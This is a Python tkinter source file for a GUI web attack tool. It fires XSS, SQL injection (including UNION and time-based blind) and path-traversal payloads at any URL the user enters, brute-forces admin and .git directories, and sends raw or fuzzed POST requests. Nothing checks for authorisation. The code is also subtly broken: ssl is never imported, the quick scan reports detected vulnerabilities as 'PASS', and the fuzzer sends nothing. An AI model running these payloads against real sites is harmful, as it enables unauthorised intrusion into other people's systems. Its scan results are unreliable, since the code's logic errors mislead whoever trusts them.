import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import urllib.request
import urllib.parse
import urllib.error
import socket
import threading
import re
import time
import base64
import json
from concurrent.futures import ThreadPoolExecutor as ThreadPool

class MobileWebPentest:
    def __init__(self, root):
        self.root = root
        self.root.title("🔥 Mobile Web Pentest v4.0")
        self.root.geometry("1000x700")
        self.root.configure(bg='#0d1117')
        self.results = {}
        self.running = False
        
        self.setup_mobile_ui()
        
    def setup_mobile_ui(self):
        # Mobile-optimized style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Mobile.TButton', font=('Arial', 11, 'bold'), padding=10)
        style.configure('Title.TLabel', font=('Arial', 16, 'bold'), foreground='#00ff88')
        style.configure('Header.TLabel', font=('Arial', 12), foreground='#ffffff')
        
        # Top frame - Target input (large touch-friendly)
        top_frame = ttk.Frame(self.root, relief='ridge', padding=10)
        top_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(top_frame, text="🎯 TARGET URL", style='Title.TLabel').pack()
        self.target_var = tk.StringVar()
        target_entry = tk.Entry(top_frame, textvariable=self.target_var, font=('Arial', 14), 
                               relief='solid', bd=2)
        target_entry.pack(fill=tk.X, pady=5)
        target_entry.bind('<Return>', lambda e: self.quick_attack())
        
        # Main notebook (tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Attack tab
        attack_frame = ttk.Frame(notebook)
        notebook.add(attack_frame, text="⚔️ ATTACKS")
        self.setup_attack_tab(attack_frame)
        
        # POST tab
        post_frame = ttk.Frame(notebook)
        notebook.add(post_frame, text="📝 POST EDITOR")
        self.setup_post_tab(post_frame)
        
        # Results tab
        results_frame = ttk.Frame(notebook)
        notebook.add(results_frame, text="📊 RESULTS")
        self.setup_results_tab(results_frame)
        
    def setup_attack_tab(self, parent):
        # Large attack buttons (mobile friendly)
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        attacks = [
            ("🚀 QUICK SCAN", self.quick_attack),
            ("🕷️ XSS TEST", self.xss_attack),
            ("💉 SQLI TEST", self.sqli_attack),
            ("📁 DIR BUST", self.dir_bust),
            ("🔍 HEADER CHECK", self.header_check),
            ("🌐 SSL TEST", self.ssl_test)
        ]
        
        for text, command in attacks:
            btn = tk.Button(btn_frame, text=text, command=command, bg='#ff4444', fg='white',
                          font=('Arial', 12, 'bold'), relief='raised', bd=3,
                          height=2, width=15)
            btn.pack(pady=8, padx=10, fill=tk.X)
            
        self.attack_log = scrolledtext.ScrolledText(parent, height=15, bg='#1a1a1a', 
                                                  fg='#00ff88', font=('Consolas', 10))
        self.attack_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def setup_post_tab(self, parent):
        ttk.Label(parent, text="📝 RAW HTTP REQUEST", style='Header.TLabel').pack(pady=5)
        
        self.request_text = scrolledtext.ScrolledText(parent, height=12, bg='#1a1a1a', 
                                                    fg='#ffffff', font=('Consolas', 10))
        self.request_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Load example POST request
        example_post = """POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

username=admin&password=pass"""
        self.request_text.insert('1.0', example_post)
        
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Button(btn_frame, text="💥 SEND REQUEST", command=self.send_custom_request,
                 bg='#44ff44', fg='black', font=('Arial', 12, 'bold')).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="🔄 FUZZ POST", command=self.fuzz_post_data,
                 bg='#ffaa00', fg='black', font=('Arial', 12, 'bold')).pack(side=tk.LEFT, padx=5)
                 
        self.response_text = scrolledtext.ScrolledText(parent, height=10, bg='#1a1a1a', 
                                                     fg='#ffaa00', font=('Consolas', 9))
        self.response_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
    def setup_results_tab(self, parent):
        self.results_tree = ttk.Treeview(parent, columns=('Type', 'Status', 'Payload', 'Response'), show='headings')
        self.results_tree.heading('Type', text='Attack Type')
        self.results_tree.heading('Status', text='Status')
        self.results_tree.heading('Payload', text='Payload')
        self.results_tree.heading('Response', text='Response')
        self.results_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
    def log(self, text, log_widget=None):
        """Thread-safe logging"""
        def update_log():
            if log_widget:
                log_widget.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {text}\n")
                log_widget.see(tk.END)
            else:
                self.attack_log.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {text}\n")
                self.attack_log.see(tk.END)
                
        self.root.after(0, update_log)
        
    def safe_request(self, url, method='GET', data=None, headers=None):
        """Safe HTTP request with error handling"""
        try:
            if headers is None:
                headers = {}
                
            req = urllib.request.Request(url, data=data, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=10) as response:
                status = response.status
                content = response.read().decode('utf-8', errors='ignore')
                return status, content
        except urllib.error.HTTPError as e:
            return e.code, str(e)
        except Exception as e:
            return 0, str(e)
            
    def quick_attack(self):
        """One-click comprehensive attack"""
        if not self.target_var.get():
            messagebox.showwarning("Warning", "Enter target URL first!")
            return
            
        threading.Thread(target=self._quick_attack_thread, daemon=True).start()
        
    def _quick_attack_thread(self):
        self.running = True
        self.log("🚀 Starting Quick Attack Suite...")
        
        url = self.target_var.get()
        tests = [
            ("Basic Connectivity", lambda: self.safe_request(url)[0] == 200),
            ("XSS Test", self.test_xss),
            ("SQLi Test", self.test_sqli),
            ("Dir Traversal", self.test_lfi)
        ]
        
        for name, test in tests:
            if not self.running: break
            result = test()
            status = "✅ PASS" if result else "❌ VULN"
            self.log(f"{name}: {status}")
            self.add_result(name, status, url, result)
            time.sleep(0.5)
            
        self.log("✅ Quick Attack Complete!")
        self.running = False
        
    def test_xss(self):
        payloads = ["<script>alert(1)</script>", "'><img src=x onerror=alert(1)>"]
        url = self.target_var.get()
        
        for payload in payloads:
            status, content = self.safe_request(f"{url}?test={urllib.parse.quote(payload)}")
            if any(p in content.lower() for p in [payload[:10].lower(), "alert("]):
                return True
        return False
        
    def test_sqli(self):
        payloads = ["' OR 1=1--", "' UNION SELECT NULL--"]
        url = self.target_var.get()
        
        for payload in payloads:
            status, content = self.safe_request(f"{url}?id={urllib.parse.quote(payload)}")
            if status == 500 or "syntax" in content.lower() or "mysql" in content.lower():
                return True
        return False
        
    def test_lfi(self):
        payloads = ["../../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts"]
        url = self.target_var.get()
        
        for payload in payloads:
            status, content = self.safe_request(f"{url}?file={urllib.parse.quote(payload)}")
            if "root:" in content or "[drivers]" in content:
                return True
        return False
        
    def xss_attack(self):
        threading.Thread(target=self._xss_thread, daemon=True).start()
        
    def _xss_thread(self):
        self.log("🕷️ XSS Attack Suite...")
        payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'><svg onload=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//"
        ]
        
        url = self.target_var.get()
        for payload in payloads:
            status, content = self.safe_request(f"{url}?q={urllib.parse.quote(payload)}")
            if payload[:10].lower() in content.lower():
                self.log(f"✅ XSS CONFIRMED: {payload[:30]}...")
                self.add_result("XSS", "VULNERABLE", payload, content[:100])
                return
        self.log("❌ No XSS found")
        
    def sqli_attack(self):
        threading.Thread(target=self._sqli_thread, daemon=True).start()
        
    def _sqli_thread(self):
        self.log("💉 SQL Injection Attack...")
        payloads = [
            "' OR 1=1--",
            "' UNION SELECT NULL,version(),user()--",
            "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--"
        ]
        
        url = self.target_var.get()
        for payload in payloads:
            start = time.time()
            status, content = self.safe_request(f"{url}?id={urllib.parse.quote(payload)}")
            elapsed = time.time() - start
            
            if status >= 500 or elapsed > 4 or "mysql" in content.lower():
                self.log(f"✅ SQLi CONFIRMED: {payload}")
                self.add_result("SQLi", "VULNERABLE", payload, f"Status: {status}, Time: {elapsed:.1f}s")
                return
        self.log("❌ No SQLi found")
        
    def dir_bust(self):
        threading.Thread(target=self._dir_bust_thread, daemon=True).start()
        
    def _dir_bust_thread(self):
        self.log("📁 Directory Busting...")
        dirs = ['admin/', 'login/', 'wp-admin/', 'phpmyadmin/', 'backup/', '.git/']
        url = self.target_var.get().rstrip('/')
        
        with ThreadPool(max_workers=5) as executor:
            futures = {executor.submit(self.safe_request, f"{url}/{d}"): d for d in dirs}
            for future in futures:
                status, _ = future.result(timeout=5)
                d = futures[future]
                if status == 200 or status == 403:
                    self.log(f"🔍 FOUND: {d} ({status})")
                    self.add_result("Directory", "FOUND", d, f"Status: {status}")
                    
    def header_check(self):
        threading.Thread(target=self._header_thread, daemon=True).start()
        
    def _header_thread(self):
        self.log("🔍 Security Header Check...")
        insecure_headers = ['X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options']
        url = self.target_var.get()
        
        req = urllib.request.Request(url)
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                headers = dict(resp.headers)
                issues = []
                
                for header in insecure_headers:
                    if header not in headers:
                        issues.append(f"❌ Missing: {header}")
                    else:
                        issues.append(f"✅ {header}: {headers[header]}")
                        
                for issue in issues:
                    self.log(issue)
                    
        except Exception as e:
            self.log(f"❌ Header check failed: {e}")
            
    def ssl_test(self):
        threading.Thread(target=self._ssl_thread, daemon=True).start()
        
    def _ssl_thread(self):
        self.log("🌐 SSL/TLS Analysis...")
        try:
            hostname = urllib.parse.urlparse(self.target_var.get()).netloc
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    self.log(f"✅ SSL Certificate: {cert.get('subject', 'Unknown')}")
                    self.log(f"📅 Expires: {cert.get('notAfter', 'Unknown')}")
        except Exception as e:
            self.log(f"❌ SSL Error: {e}")
            
    def send_custom_request(self):
        """Send custom HTTP request from POST editor"""
        request_data = self.request_text.get('1.0', tk.END).strip()
        if not request_data:
            messagebox.showwarning("Warning", "Enter request data first!")
            return
            
        threading.Thread(target=self._send_request_thread, daemon=True).start()
        
    def _send_request_thread(self):
        lines = self.request_text.get('1.0', tk.END).strip().split('\n')
        if len(lines) < 2:
            self.response_text.insert(tk.END, "❌ Invalid request format\n")
            return
            
        # Parse request
        first_line = lines[0].split()
        method, target = first_line[0], first_line[1]
        headers = {}
        body = ""
        
        i = 1
        while i < len(lines) and lines[i].strip() and ':' in lines[i]:
            key, value = lines[i].split(':', 1)
            headers[key.strip()] = value.strip()
            i += 1
            
        if i < len(lines):
            body = '\n'.join(lines[i:])
            
        # Send request
        url = f"https://{headers.get('Host', 'localhost')}{target}" if target.startswith('/') else target
        self.response_text.insert(tk.END, f"📤 Sending {method} {url}\n")
        
        data = body.encode() if body else None
        status, response = self.safe_request(url, method, data, headers)
        
        self.response_text.insert(tk.END, f"📥 Status: {status}\n")
        self.response_text.insert(tk.END, f"Response: {response[:500]}...\n")
        self.response_text.see(tk.END)
        
    def fuzz_post_data(self):
        """Fuzz POST parameters"""
        threading.Thread(target=self._fuzz_post_thread, daemon=True).start()
        
    def _fuzz_post_thread(self):
        self.log("🔄 POST Data Fuzzing...")
        payloads = ["' OR 1=1--", "<script>alert(1)</script>", "../etc/passwd"]
        
        # Extract POST data from request
        request = self.request_text.get('1.0', tk.END)
        post_data_match = re.search(r'(\n\r?\n)(.*)', request, re.DOTALL)
        
        if post_data_match:
            original_body = post_data_match.group(2).strip()
            for payload in payloads:
                # Simple param replacement fuzzing
                fuzzed_body = original_body.replace("password=", f"password={urllib.parse.quote(payload)}")
                self.log(f"Testing payload: {payload[:20]}...")
                # Here you would send the fuzzed request
                time.sleep(0.5)
        else:
            self.log("❌ No POST data found in request")
            
    def add_result(self, attack_type, status, payload, response):
        """Add result to results table"""
        self.root.after(0, lambda: self.results_tree.insert('', 'end', 
                         values=(attack_type, status, payload[:50], response[:50])))
        
    def inject_payload(self):
        """Inject payload at cursor position"""
        pos = self.request_text.index(tk.INSERT)
        payload = "§FUZZ§"  # Marker for manual fuzzing
        self.request_text.insert(pos, payload)
        messagebox.showinfo("Injected", f"Payload injected at {pos}")

if __name__ == "__main__":
    root = tk.Tk()
    app = MobileWebPentest(root)
    root.mainloop()